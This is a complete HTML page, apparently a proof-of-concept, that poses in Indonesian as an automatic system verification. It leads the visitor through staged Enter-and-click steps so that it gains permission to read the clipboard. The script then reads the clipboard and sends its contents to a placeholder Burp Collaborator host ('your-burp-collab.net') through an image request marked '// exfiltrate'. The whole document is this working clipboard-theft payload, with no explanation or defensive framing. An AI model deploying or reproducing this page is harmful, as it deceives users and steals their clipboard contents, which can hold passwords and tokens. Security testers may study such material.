<!DOCTYPE html>
<html>
<head>
  <title>Validasi Sistem</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    button {
      font-size: 18px;
      padding: 12px 24px;
      margin-top: 30px;
      cursor: pointer;
    }
    #msg {
      margin-top: 20px;
      font-size: 16px;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
      color: green;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>

  <h2>Validasi Sistem Otomatis</h2>
  <div id="msg">ðŸ“Œ Tekan tombol ENTER untuk memulai verifikasi</div>
  <button id="btn" style="display: none;">Lanjutkan Verifikasi</button>
  <div id="result"></div>

  <script>
    let stage = 0;
    let triggered = false;
    let clipboardCache = "";

    document.addEventListener("keydown", async (e) => {
      if (e.key !== "Enter" || triggered) return;

      if (stage === 0) {
        stage = 1;
        document.getElementById("msg").innerText = "âœ… Tahap 1 selesai. Sekarang klik tombol di bawah ini.";
        document.getElementById("btn").style.display = "inline-block";
      } else if (stage === 2) {
        triggered = true;
        document.getElementById("msg").innerText = "ðŸ“‹ Membaca clipboard...";

        try {
          const text = await navigator.clipboard.readText();
          clipboardCache = text;
          document.getElementById("result").innerText = "ðŸ“‹ Clipboard berisi:\n" + text;

          // exfiltrate
          const img = new Image();
          img.src = "https://your-burp-collab.net/log?clip=" + encodeURIComponent(text);
        } catch (err) {
          document.getElementById("msg").innerText = "âŒ Gagal membaca clipboard: " + err;
        }
      }
    });

    document.getElementById("btn").addEventListener("click", () => {
      if (stage === 1) {
        stage = 2;
        document.getElementById("msg").innerText = "ðŸŸ¢ Sekarang tekan ENTER sekali lagi untuk menyelesaikan verifikasi.";
      }
    });
  </script>

</body>
</html>
